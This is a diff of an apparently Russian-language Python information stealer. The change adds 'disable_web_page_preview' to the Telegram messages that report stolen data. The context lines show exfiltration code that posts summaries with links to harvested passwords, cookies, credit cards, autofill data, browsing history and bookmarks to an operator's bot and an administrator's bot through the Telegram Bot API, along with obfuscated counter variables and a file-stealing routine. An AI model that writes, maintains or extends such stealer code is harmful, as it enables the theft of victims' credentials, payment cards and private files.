@@ -1444,7 +1444,7 @@ def filestealr():
     log_message("filestealr завершена")
 
 def send_telegram_summary():
-    """Отправляет итоговое сообщение в Telegram пользователю и администратору."""
+    """Отправляет итоговое сообщение в Telegram пользователю и администратору (без превью ссылок)."""
     global GLINFO, PASSWORDS_LINK, COOKIES_LINK, CREDITCARDS_LINK, AUTOFILLS_LINK, HISTORIES_LINK, BOOKMARKS_LINK, FILES_ARCHIVE_LINK
     global P455WC0UNt, C00K1C0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt
     global p45WW0rDs, c00K1W0rDs
@@ -1589,14 +1589,15 @@ def send_telegram_summary():
         send_log_to_api(part, 'text')
         log_message(f"Часть {idx}/{len(parts)} отправлена через API")
 
-    # ====== 2. Отправка ПОЛЬЗОВАТЕЛЮ (через его бота) ======
+    # ====== 2. Отправка ПОЛЬЗОВАТЕЛЮ (с отключением превью) ======
     try:
         for part in parts:
             url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
             payload = {
                 "chat_id": TG_CHAT_ID,
                 "text": part,
-                "parse_mode": "HTML"
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True   # ← отключаем превью ссылок
             }
             resp = requests.post(url, json=payload, timeout=10)
             if resp.status_code == 200:
@@ -1606,14 +1607,15 @@ def send_telegram_summary():
     except Exception as e:
         log_message(f"Исключение при отправке пользователю: {e}")
 
-    # ====== 3. Отправка АДМИНИСТРАТОРУ (с пометкой от какого пользователя) ======
+    # ====== 3. Отправка АДМИНИСТРАТОРУ (с пометкой и отключением превью) ======
     try:
         for part in parts:
             url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
             payload = {
                 "chat_id": ADMIN_CHAT_ID,
                 "text": f"📨 Лог от пользователя {USER_ID}:\n\n{part}",
-                "parse_mode": "HTML"
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True   # ← отключаем превью ссылок
             }
             resp = requests.post(url, json=payload, timeout=10)
             if resp.status_code == 200:
